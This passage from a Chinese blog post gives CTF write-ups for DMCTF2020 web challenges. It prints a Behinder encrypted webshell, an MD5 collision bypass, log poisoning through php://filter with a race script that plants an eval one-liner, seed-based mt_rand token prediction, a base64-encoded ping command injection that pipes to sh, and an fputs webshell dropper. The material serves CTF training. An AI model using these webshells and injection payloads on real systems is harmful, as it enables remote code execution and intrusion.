</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PHP
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>@error_reporting(0);
</span></span><span class=line><span class=cl>session_start();
</span></span><span class=line><span class=cl>//如果接收到pass参数，则会生成16位的随机秘钥，存储到session中
</span></span><span class=line><span class=cl>$a = $_GET[&#39;a&#39;];
</span></span><span class=line><span class=cl>$b = $_GET[&#39;b&#39;];
</span></span><span class=line><span class=cl>if($a!=$b&amp;&amp;md5($a)==md5($b))
</span></span><span class=line><span class=cl>{
</span></span><span class=line><span class=cl>    echo &#34;you are right&#34;;
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>else{
</span></span><span class=line><span class=cl>    die(&#34;no ,you are not a real hacker !!!&#34;);
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>if (isset($_GET[&#39;secret&#39;]))
</span></span><span class=line><span class=cl>{
</span></span><span class=line><span class=cl>    $key=substr(md5(uniqid(rand())),16);
</span></span><span class=line><span class=cl>    $_SESSION[&#39;k&#39;]=$key;
</span></span><span class=line><span class=cl>    print $key;
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>else
</span></span><span class=line><span class=cl>{
</span></span><span class=line><span class=cl>    $key=$_SESSION[&#39;k&#39;];
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    $post=file_get_contents(&#34;php://input&#34;);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    if(!extension_loaded(&#39;openssl&#39;))
</span></span><span class=line><span class=cl>    {
</span></span><span class=line><span class=cl>        $t=&#34;base64_&#34;.&#34;decode&#34;;
</span></span><span class=line><span class=cl>        $post=$t($post.&#34;&#34;);
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        for($i=0;$i&lt;strlen($post);$i++) {
</span></span><span class=line><span class=cl>                 $post[$i] = $post[$i]^$key[$i+1&amp;15];
</span></span><span class=line><span class=cl>                }
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    else
</span></span><span class=line><span class=cl>    {
</span></span><span class=line><span class=cl>        $post=openssl_decrypt($post, &#34;AES128&#34;, $key);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    $arr=explode(&#39;|&#39;,$post);
</span></span><span class=line><span class=cl>    $func=$arr[0];
</span></span><span class=line><span class=cl>    $params=$arr[1];
</span></span><span class=line><span class=cl>    class C{public function __construct($p) {eval($p.&#34;&#34;);}}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    @new C($params);
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>?&gt;
</span></span></code></pre></td></tr></table></div></div><p>后半部分根据Behinder的<a href=https://xz.aliyun.com/t/2774 target=_blank rel="noopener noreffer">官方文档</a>和博客<a href=https://blog.csdn.net/weixin_39190897/article/details/109417674 target=_blank rel="noopener noreffer">渗透测试-流量加密之冰蝎&蚁剑</a>的讲解，认为这个文件是个冰蝎马，参考博客中对加密通信流程进行了讲解，链接的密码为第15行<code>$_GET['secret']</code>中的<code>secret</code>。但是php文件前半部分（代码第5-13行）还需绕过，看到md5函数可以利用上一题<strong>weak_type</strong>中提到的不同字符串加密后md5相同绕过。最后payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>CODE
</span></span><span class=line><span class=cl>http://网址/bingxie.php?a=QNKCDZO&amp;b=240610708
</span></span></code></pre></td></tr></table></div></div><p>使用Behinder连接。可以在根目录下找到flag。</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129210207.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129210207.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129210207.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129210207.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129210207.png title=img></p><h2 id=filerce class=headerLink><a href=#filerce class=header-mark></a>filerce</h2><p>先看提示：<strong>看看log里面存的什么（利用伪协议包含）</strong>，以下是访问后页面：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PHP
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>error_reporting(0);
</span></span><span class=line><span class=cl>show_source(__FILE__);
</span></span><span class=line><span class=cl>$sandbox = &#39;/var/www/html/sandbox/&#39;.md5(&#34;DMCTF&#34;.$_SERVER[&#39;REMOTE_ADDR&#39;]);
</span></span><span class=line><span class=cl>mkdir($sandbox,0777,true);
</span></span><span class=line><span class=cl>chdir($sandbox);
</span></span><span class=line><span class=cl>if (isset($_GET[&#39;file&#39;])) {
</span></span><span class=line><span class=cl>    if (strpos($_GET[&#34;file&#34;], &#34;base64-decode&#34;)) {
</span></span><span class=line><span class=cl>        include $_GET[&#34;file&#34;];
</span></span><span class=line><span class=cl>    } else {
</span></span><span class=line><span class=cl>        echo &#34;Hacker!!!&#34;;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>else{
</span></span><span class=line><span class=cl>    echo &#34;get me a file&#34;;
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>file_put_contents(&#34;thx.log&#34;, base64_encode(&#39;http://&#39;.$_SERVER[&#39;HTTP_HOST&#39;].urldecode($_SERVER[&#39;REQUEST_URI&#39;])));
</span></span><span class=line><span class=cl>echo &#34;&lt;br/&gt;&#34;;
</span></span><span class=line><span class=cl>echo &#34;You&#39;ve been recorded in $sandbox/thx.log!!!!&#34;
</span></span><span class=line><span class=cl>?&gt; get me a file
</span></span><span class=line><span class=cl>You&#39;ve been recorded in /var/www/html/sandbox/7e8c62b0ef1fa8de7542dd2272a4d021/thx.log!!!!
</span></span></code></pre></td></tr></table></div></div><p>使用文件包含查看thx.log有什么，请求访问：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>CODE
</span></span><span class=line><span class=cl>http://网址?file=php://filter/convert.base64-decode/resource=thx.log
</span></span></code></pre></td></tr></table></div></div><p>输出了thx.log文件内容：<code>http://dmctf.vaala.cloud:28236/favicon.ico</code>，访问以后发现还是刚进来的页面。分析17行以下的代码，会打开thx.log文件，在里面写入的内容是<code>http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']</code>，也就是我们请求题目页面的url地址，并且多次请求以后发现log中内容成了<code>http://网址?file=php://filter/convert.base64-decode/resource=thx.log</code>。判断为竞争写入导致（因为之前做过竞争上传题目），所以在构造url中写入一句话木马：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>CODE
</span></span><span class=line><span class=cl>http://网址?file=php://filter/&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;convert.base64-decode/resource=thx.log
</span></span></code></pre></td></tr></table></div></div><p>使用python脚本不断写入：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PYTHON
</span></span><span class=line><span class=cl>#coding=utf-8
</span></span><span class=line><span class=cl>import requests
</span></span><span class=line><span class=cl>import sys
</span></span><span class=line><span class=cl>def CompeteUpload():  #上传页面
</span></span><span class=line><span class=cl>    geturl=&#34;http://dmctf.vaala.cloud:28426/?file=php://filter/&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;convert.base64-decode/resource=thx.log&#34;     #访问上传文件
</span></span><span class=line><span class=cl>    r1=requests.get(url=geturl)
</span></span><span class=line><span class=cl>if __name__==&#34;__main__&#34;:
</span></span><span class=line><span class=cl>    i=10;
</span></span><span class=line><span class=cl>    while (i&gt;0):
</span></span><span class=line><span class=cl>        i-=1;
</span></span><span class=line><span class=cl>        CompeteUpload();
</span></span></code></pre></td></tr></table></div></div><p>尝试访问<code>http://网址/sandbox/7e8c62b0ef1fa8de7542dd2272a4d021/thx.log</code>，会下载log文件，使用base64解码以后发现一句话木马存在，直接蚁剑连接：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>CODE
</span></span><span class=line><span class=cl>http://网址?file=php://filter/convert.base64-decode/resource=thx.log
</span></span></code></pre></td></tr></table></div></div><p>同样在根目录下找到flag。</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129224231.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129224231.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129224231.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129224231.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129224231.png title=img></p><h2 id=do_you_have_a_right_token class=headerLink><a href=#do_you_have_a_right_token class=header-mark></a>do_you_have_a_right_token</h2><p>F12查看网页代码，发现注释中一大段php代码估计就是题目用到的：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PHP
</span></span><span class=line><span class=cl>&lt;?php 
</span></span><span class=line><span class=cl>session_start();
</span></span><span class=line><span class=cl>include &#39;flag.php&#39;;
</span></span><span class=line><span class=cl>date_default_timezone_set(&#39;Asia/Shanghai&#39;);
</span></span><span class=line><span class=cl>if(isset($_POST[&#39;token&#39;]) &amp;&amp; isset($_SESSION[&#39;token&#39;]) &amp;&amp;!empty($_POST[&#39;token&#39;])&amp;&amp;!empty($_SESSION[&#39;token&#39;])){
</span></span><span class=line><span class=cl>    if($_POST[&#39;token&#39;]==$_SESSION[&#39;token&#39;]){
</span></span><span class=line><span class=cl>        echo &#34;PassResetSuccess! Your Flag is:&#34;.$flag;
</span></span><span class=line><span class=cl>    }else{
</span></span><span class=line><span class=cl>        echo &#34;Token_error!&#34;;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}else{
</span></span><span class=line><span class=cl>    mt_srand(time());
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    $rand= mt_rand();
</span></span><span class=line><span class=cl>    $_SESSION[&#39;token&#39;]=sha1(md5($rand));
</span></span><span class=line><span class=cl>    echo &#34;Token Generate Ok!&#34;;
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>echo &#39;&lt;form action=&#34;&#34; method=&#34;POST&#34;&gt;
</span></span><span class=line><span class=cl>    &lt;input type=&#34;text&#34; name=&#34;token&#34;&gt;
</span></span><span class=line><span class=cl>    &lt;input type=&#34;submit&#34; value=&#34;submit&#34;&gt;
</span></span><span class=line><span class=cl>&lt;/form&gt;&#39;;
</span></span><span class=line><span class=cl>echo &#34;&lt;!--\r\n&#34;.file_get_contents(__FILE__);
</span></span><span class=line><span class=cl>?&gt;
</span></span></code></pre></td></tr></table></div></div><p>分析一波：判断post请求中的<code>token</code>，如果不为空则与<code>$_SESSION['token']</code>判断是否相等，相等输出flag，再往下看12-16行，如果为空的话使用当前时间作为随机数的种子，生成一个随机数并进行md5和sha1函数加密并存入<code>$_SESSION[‘token’]</code>。</p><p>所以思路就是：<strong>我们需要知道生成的那个随机数的值</strong>，在网上搜到参考<a href=https://blog.csdn.net/zss192/article/details/104327432 target=_blank rel="noopener noreffer">php伪随机数</a>，可以根据种子预测随机数。题目使用：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>CODE
</span></span><span class=line><span class=cl>mt_srand(time());
</span></span></code></pre></td></tr></table></div></div><p>根据第4行设置时区时间并设置随机数种子，所以在本地环境使用相同方法尝试预测随机数，但是还需考虑到本地时间和题目服务器时间不同步问题，我想到的方法是借用之前题目获得的webshell上传php文件对本地时间进行校正：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PHP
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>date_default_timezone_set(&#39;Asia/Shanghai&#39;);
</span></span><span class=line><span class=cl>echo time();
</span></span><span class=line><span class=cl>?&gt;
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129211010.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129211010.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129211010.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129211010.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129211010.png title=img></p><p>计算时间差为69，所以修改代码跑一遍：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PHP
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>date_default_timezone_set(&#39;Asia/Shanghai&#39;);
</span></span><span class=line><span class=cl>// echo time()-69;  这是我验证时间用的
</span></span><span class=line><span class=cl>    mt_srand(time()-69);
</span></span><span class=line><span class=cl>    $rand = mt_rand();
</span></span><span class=line><span class=cl>    echo sha1(md5($rand));
</span></span><span class=line><span class=cl>?&gt;
</span></span></code></pre></td></tr></table></div></div><p>提交本地运行后得到的密文提交上去就可以获得flag。</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129211832.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129211832.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129211832.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129211832.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129211832.png title=img></p><h2 id=pingpingping class=headerLink><a href=#pingpingping class=header-mark></a>pingpingping</h2><p>进入以后是一个类似终端的界面，随便输几个指令提示：<strong>输入help获得提示</strong>，help以后又提示只能使用test和login，进入test以后提示输入url地址，所以这个才是符合题目的<code>pingpingping</code>，可以使用通道符<code>|</code>连接执行其他命令，搜索到了疑似本题的博客<a href=https://www.jianshu.com/p/fd7f9fcc9333 target=_blank rel="noopener noreffer">GXYCTF–PingPingPing</a>，猜测flag很有可能还在根目录下，所以可以执行<code>cat /flag</code>输出，模仿博客中的构造方式把payload进行base64编码，使用sh执行命令，最终payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>CODE
</span></span><span class=line><span class=cl>127.0.0.1|echo$IFS$1Y2F0IC9mbGFn|base64$IFS$1-d|sh
</span></span></code></pre></td></tr></table></div></div><p>获得flag</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129230355.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129230355.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129230355.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129230355.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129230355.png title=img></p><h2 id=p3webshell class=headerLink><a href=#p3webshell class=header-mark></a>p3’webshell</h2><p>提示给了一个链接：<a href=https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html target=_blank rel="noopener noreffer">一些不包含数字和字母的webshell</a>，看了以后确实受益匪浅收获很多，但是对于这个题目来说是一个烟雾弹。（更正，是我没看后面题，后面题用到了这个提示，这篇文章会继续更新。）</p><p>源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>CODE
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>$command=$_POST[&#39;command&#39;];
</span></span><span class=line><span class=cl>highlight_file(__FILE__);
</span></span><span class=line><span class=cl>if(!preg_match(&#39;/\&#39;|{|\(|\)|}|\$|_|=|1|\+|;|\./i&#39;, $command)){
</span></span><span class=line><span class=cl>    die(&#34;&lt;script&gt;alert(&#39;?&#39;)&lt;/script&gt;&#34;);
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>eval($command);
</span></span><span class=line><span class=cl>?&gt;
</span></span></code></pre></td></tr></table></div></div><p>第4行使用正则表达式匹配<code>$command</code>字符串，但是前面有一个<code>!</code>取反，所以只要payload匹配到正则表达式即可绕过。post中请求：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>CODE
</span></span><span class=line><span class=cl>command=fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;&#39;);
</span></span></code></pre></td></tr></table></div></div><p>使用蚁剑连接<code>http://网址/shell.php</code>，在根目录里找到flag。</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129225225.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129225225.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129225225.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129225225.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129225225.png title=img></p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2020-11-29</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/web/>Web</a>,&nbsp;<a href=/tags/dmctf2020/>DMCTF2020</a>,&nbsp;<a href=/tags/rce/>RCE</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/posts/jsdelivr-%E7%BC%93%E5%AD%98%E5%88%B7%E6%96%B0/ class=prev rel=prev title="jsdelivr 缓存刷新"><i class="fas fa-angle-left fa-fw"></i>jsdelivr 缓存刷新</a>
<a href=/posts/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/ class=next rel=next title=PicGo复制自定义链接>PicGo复制自定义链接<i class="fas fa-angle-right fa-fw"></i></a></div></div><div id=comments><div id=valine class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>由 <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.101.0">Hugo</a> 强力驱动&nbsp;|&nbsp;主题 - <a href=https://github.com/HEIGE-PCloud/DoIt target=_blank rel="noopener noreffer" title="DoIt 0.2.13"><i class="far fa-edit fa-fw"></i> DoIt</a></div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2020 - 2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank rel="noopener noreferrer">Braindance</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div><div class=footer-line></div><div class=footer-line></div></div></footer></div><div id=fixed-buttons><a href=#back-to-top id=back-to-top-button class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw"></i>
</a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw"></i></a></div><div class=assets><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/fuse/fuse.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/topbar/topbar.min.js></script><script type=text/javascript src=/lib/pjax/pjax.min.js></script><script type=text/javascript src=/js/theme.min.js defer></script><script type=text/javascript>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","UA-176925141-1",{anonymize_ip:!0})</script><script type=text/javascript src="https://www.googletagmanager.com/gtag/js?id=UA-176925141-1" async></script><script>var _hmt=_hmt||[];(function(){var e,t=document.createElement("script");t.src="https://hm.baidu.com/hm.js?3b1ab845351bb3a8ee808b639bca6ce5",e=document.getElementsByTagName("script")[0],e.parentNode.insertBefore(t,e)})()</script></div><div class=pjax-assets><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:10},comment:{valine:{appId:"shaenDlkzwy9NvdCNJVrJspu-MdYXbMMI",appKey:"e074xMKoSw3B9kWmBediaBE9",avatar:"mp",el:"#valine",emojiCDN:"//img.braindance.top/CDN/emoji/",emojiMaps:{"2233_卖萌":"2233/卖萌n.png","2233_吃惊":"2233/吃惊n.png","2233_吐魂":"2233/吐魂.png","2233_喝水":"2233/喝水.png","2233_困惑":"2233/困惑n.png","2233_大哭":"2233/大哭.png","2233_大笑":"2233/大笑n.png","2233_委屈":"2233/委屈.png","2233_怒":"2233/怒.png","2233_无言":"2233/无言.png","2233_汗":"2233/汗n.png","2233_疑问":"2233/疑问n.png","2233_第一":"2233/第一.png","2233_耶":"2233/耶.png","2233_郁闷":"2233/郁闷.png",tv_doge:"xiaodianshi/doge.gif","tv_亲亲":"xiaodianshi/亲亲.gif","tv_偷笑":"xiaodianshi/偷笑.gif","tv_再见":"xiaodianshi/再见.gif","tv_发怒":"xiaodianshi/发怒.gif","tv_发财":"xiaodianshi/发财.gif","tv_可爱":"xiaodianshi/可爱.gif","tv_吐血":"xiaodianshi/吐血.gif","tv_呆":"xiaodianshi/呆.gif","tv_呕吐":"xiaodianshi/呕吐.gif","tv_困":"xiaodianshi/困.gif","tv_坏笑":"xiaodianshi/坏笑.gif","tv_大佬":"xiaodianshi/大佬.gif","tv_大哭":"xiaodianshi/大哭.gif","tv_委屈":"xiaodianshi/委屈.gif","tv_害羞":"xiaodianshi/害羞.gif","tv_尴尬":"xiaodianshi/尴尬.gif","tv_微笑":"xiaodianshi/微笑.gif","tv_思考":"xiaodianshi/思考.gif","tv_打脸":"xiaodianshi/打脸.gif","tv_抓狂":"xiaodianshi/抓狂.gif","tv_抠鼻子":"xiaodianshi/抠鼻子.gif","tv_斜眼笑":"xiaodianshi/斜眼笑.gif","tv_晕":"xiaodianshi/晕.gif","tv_流汗":"xiaodianshi/流汗.gif","tv_流鼻血":"xiaodianshi/流鼻血.gif","tv_点赞":"xiaodianshi/点赞.gif","tv_生气":"xiaodianshi/生气.gif","tv_生病":"xiaodianshi/生病.gif","tv_疑问":"xiaodianshi/疑问.gif","tv_白眼":"xiaodianshi/白眼.gif","tv_睡着":"xiaodianshi/睡着.gif","tv_笑哭":"xiaodianshi/笑哭.gif","tv_腼腆":"xiaodianshi/腼腆.gif","tv_色":"xiaodianshi/色.gif","tv_调皮":"xiaodianshi/调皮.gif","tv_鄙视":"xiaodianshi/鄙视.gif","tv_闭嘴":"xiaodianshi/闭嘴.gif","tv_难过":"xiaodianshi/难过.gif","tv_馋":"xiaodianshi/馋.gif","tv_黑人问号":"xiaodianshi/黑人问号.gif","tv_鼓掌":"xiaodianshi/鼓掌.gif","蛆音娘_OK":"quyinniang/OK.png","蛆音娘_die":"quyinniang/die.png","蛆音娘_偷看":"quyinniang/偷看.png","蛆音娘_卖萌":"quyinniang/卖萌.png","蛆音娘_吃惊":"quyinniang/吃惊q.png","蛆音娘_吃瓜群众":"quyinniang/吃瓜群众.png","蛆音娘_吐血":"quyinniang/吐血.png","蛆音娘_哭泣":"quyinniang/哭泣q.png","蛆音娘_哼":"quyinniang/哼.png","蛆音娘_大笑":"quyinniang/大笑.png","蛆音娘_害怕":"quyinniang/害怕.png","蛆音娘_扶额":"quyinniang/扶额.png","蛆音娘_摇头":"quyinniang/摇头.png","蛆音娘_无语":"quyinniang/无语q.png","蛆音娘_机智":"quyinniang/机智.png","蛆音娘_滑稽":"quyinniang/滑稽.png","蛆音娘_生气":"quyinniang/生气.png","蛆音娘_疑问":"quyinniang/疑问.png","蛆音娘_睡觉觉":"quyinniang/睡觉觉.png","蛆音娘_肥皂":"quyinniang/肥皂.png"},enableQQ:!1,highlight:!0,lang:"zh-cn",pageSize:5,placeholder:"Just go go",recordIP:!0,serverURLs:"https://shaendlk.api.lncldglobal.com",visitor:!0}},lightGallery:{actualSize:!1,exThumbImage:"data-thumbnail",hideBarsDelay:2e3,selector:".lightgallery",speed:400,thumbContHeight:80,thumbWidth:80,thumbnail:!0},search:{distance:100,findAllMatches:!1,fuseIndexURL:"/index.json",highlightTag:"em",ignoreFieldNorm:!1,ignoreLocation:!1,isCaseSensitive:!1,location:0,maxResultLength:10,minMatchCharLength:2,noResultsFound:"没有找到结果",snippetLength:50,threshold:.3,type:"fuse",useExtendedSearch:!1},twemoji:!0}</script><script type=text/javascript src=/lib/valine/Valine.min.js defer></script><script type=text/javascript src=/js/valine.min.js defer></script><script type=text/javascript src=/lib/twemoji/twemoji.min.js defer></script><script type=text/javascript 